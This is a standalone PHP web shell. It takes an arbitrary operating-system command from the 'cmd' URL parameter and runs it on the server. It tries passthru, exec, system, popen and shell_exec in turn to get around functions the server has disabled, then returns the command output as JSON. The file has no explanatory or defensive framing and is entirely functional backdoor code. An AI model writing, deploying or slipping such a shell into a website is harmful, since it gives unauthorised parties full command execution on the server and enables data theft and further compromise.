<?php
$result = "";
$command = "";
$disabled = explode(',', ini_get('disable_functions'));

ob_start();
if(isset($_GET['cmd'])){
    if(!in_array('passthru', $disabled)){
        $command = 'passthru';
        passthru($_GET['cmd']);
    }elseif(!in_array('exec', $disabled)){
        $command = 'exec';
        exec($_GET['cmd'], $output, $retval);
        foreach($output as $value) {
            echo $value."\n";
        }
    }elseif(!in_array('system', $disabled)){
        $command = 'system';
        system($_GET['cmd'], $retval);
    }elseif(!in_array('popen', $disabled)){
        $command = "popen";
        $handle = popen($_GET['cmd'], 'r');
        $read = fread($handle, 2096);
        echo $read;
        pclose($handle);
    }elseif(!in_array('shell_exec', $disabled)){
        $command = "shell_exec";
        echo shell_exec($_GET['cmd']);
    }else{
        echo 'Shell commands are disabled';
    }
}
$result = ob_get_contents();
ob_end_clean();

if(isset($_GET['cmd'])) {
    echo json_encode(
        array(
            "command" => $command,
            "result" => $result
        )
    );
    die;
}
?>
